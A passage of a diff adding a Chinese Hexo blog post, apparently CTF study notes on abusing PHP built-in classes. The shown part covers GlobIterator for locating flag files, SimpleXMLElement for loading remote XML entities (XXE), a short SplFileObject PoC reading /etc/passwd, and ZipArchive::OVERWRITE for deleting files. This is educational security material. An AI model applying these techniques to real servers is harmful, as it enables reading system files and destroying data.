class_">FilesystemIterator</span>::<span class="hljs-variable constant_">SKIP_DOTS</span> )<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">current</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">getFlags</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">key</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">next</span> ( ) : <span class="hljs-keyword">void</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">rewind</span> ( ) : <span class="hljs-keyword">void</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">setFlags</span> ( <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = ? ) : <span class="hljs-keyword">void</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>当我们知道flag文件在根目录，但是不知道flag文件的完整名，可以使用Globlterator(&#x2F;<em>flag</em>&#x2F;)</p>
+<p><img src="/../images/20210809203839.png" alt="image-20210809203750996"></p>
+<h1 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h1><p>用于解析XML文档中的元素</p>
+<p>官方文档对SimpleXMLElement类构造方法SimpleXMLElement::__construct定义：</p>
+<p><img src="/../images/image-20231215162830705.png" alt="image-20231215162830705"></p>
+<p><img src="/../images/image-20231215162844688.png" alt="image-20231215162844688"></p>
+<p>可以看到第三个参数data_is_url为true，我们可以实现远程xml文件的载入</p>
+<p>第二个参数的常量值我们设置为2即可</p>
+<p>第一个参数data就是我们自己设置的payload的url地址，用于引入外部实体的url</p>
+<h1 id="SplFileInfo"><a href="#SplFileInfo" class="headerlink" title="SplFileInfo"></a>SplFileInfo</h1><ul>
+<li>PHP5,7,8</li>
+</ul>
+<p>SplFileInfo类为单个文件的信息提供了高级的面向对象接口</p>
+<p>SplFileInfo::__toString  将文件路径作为字符串返回</p>
+<p>PoC</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h1><p>SplFileObject类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等</p>
+<p>该类的构造方法可以构造一个新的文件对象用于后续的读取</p>
+<p>PoC</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="ZipArchive"><a href="#ZipArchive" class="headerlink" title="ZipArchive"></a>ZipArchive</h1><ul>
+<li>PHP&gt;5</li>
+</ul>
+<p>可以对文件进行压缩与解压缩</p>
+<ul>
+<li><code>ZipArchive::addEmptyDir</code>：添加一个新的文件目录</li>
+<li><code>ZipArchive::addFile</code>：将文件添加到指定zip压缩包中</li>
+<li><code>ZipArchive::addFromString</code>：添加新的文件同时将内容添加进去</li>
+<li><code>ZipArchive::close</code>：关闭ziparchive</li>
+<li><code>ZipArchive::extractTo</code>：将压缩包解压</li>
+<li><code>ZipArchive::open</code>：打开一个zip压缩包</li>
+<li><code>ZipArchive::deleteIndex</code>：删除压缩包中的某一个文件，如：<code>deleteIndex(0)</code>代表删除第一个文件</li>
+<li><code>ZipArchive::deleteName</code>：删除压缩包中的某一个文件名称，同时也将文件删除</li>
+</ul>
+<p>来看看ZipArchive::open方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">open</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> ] ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure>
+
+<p>该方法用来打开一个新的或现有的zip存档进行读取、写入、修改</p>
+<ul>
+<li><code>$filename</code>：要打开的ZIP存档的文件名。</li>
+<li><code>$flags</code>：用于打开档案的模式。有以下几种模式：</li>
+<li><code>ZipArchive::OVERWRITE</code>：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</li>
+<li><code>ZipArchive::CREATE</code>：如果不存在则创建一个zip压缩包。</li>
+<li><code>ZipArchive::RDONLY</code>：只读模式打开压缩包。</li>
+<li><code>ZipArchive::EXCL</code>：如果压缩包已经存在，则出错。</li>
+<li><code>ZipArchive::CHECKCONS</code>：对压缩包执行额外的一致性检查，如果失败则显示错误。</li>
+</ul>
+<p>如果设置flags值为ZipArchive::OVERWRITE的话，可以删除指定文件</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-variable">$a</span> = new Zip<span class="hljs-params">Archive</span>()<span class="hljs-comment">;</span><br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-literal">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-title function_">ZipArchive::OVERWRITE</span>)<span class="hljs-comment">;  </span><br></code></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/12/11/BUUCTF%E5%88%B7%E9%A2%98/" rel="next" title="BUUCTF刷题(持续更新)">
+                <i class="fa fa-chevron-left"></i> BUUCTF刷题(持续更新)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2023/12/15/%E7%90%A2%E5%85%89%E6%9D%AF%E6%96%B0%E7%94%9F%E8%B5%9Bwp-web/" rel="prev" title="琢光杯新生赛wp(web)">
+                琢光杯新生赛wp(web) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
 
     <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      
     </div>
   </div>
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+          </div>
+          
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Error-Exception"><span class="nav-number">2.</span> <span class="nav-text">Error&#x2F;Exception</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Error"><span class="nav-number">2.1.</span> <span class="nav-text">Error</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Error%E7%B1%BB"><span class="nav-number">2.1.1.</span> <span class="nav-text">Error类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Error%E5%86%85%E7%BD%AE%E7%B1%BB%E6%9D%A5%E6%9E%84%E9%80%A0xss"><span class="nav-number">2.1.2.</span> <span class="nav-text">使用Error内置类来构造xss</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exception"><span class="nav-number">2.2.</span> <span class="nav-text">Exception</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Exception%E7%B1%BB"><span class="nav-number">2.2.1.</span> <span class="nav-text">Exception类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Exception%E7%B1%BB%E6%9E%84%E9%80%A0xss"><span class="nav-number">2.2.2.</span> <span class="nav-text">使用Exception类构造xss</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SoapClient"><span class="nav-number">3.</span> <span class="nav-text">SoapClient</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Directorylterator"><span class="nav-number">4.</span> <span class="nav-text">Directorylterator</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Filesystemlterator"><span class="nav-number">5.</span> <span class="nav-text">Filesystemlterator</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Globlterator"><span class="nav-number">6.</span> <span class="nav-text">Globlterator</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SimpleXMLElement"><span class="nav-number">7.</span> <span class="nav-text">SimpleXMLElement</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SplFileInfo"><span class="nav-number">8.</span> <span class="nav-text">SplFileInfo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SplFileObject"><span class="nav-number">9.</span> <span class="nav-text">SplFileObject</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ZipArchive"><span class="nav-number">10.</span> <span class="nav-text">ZipArchive</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">p0l1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
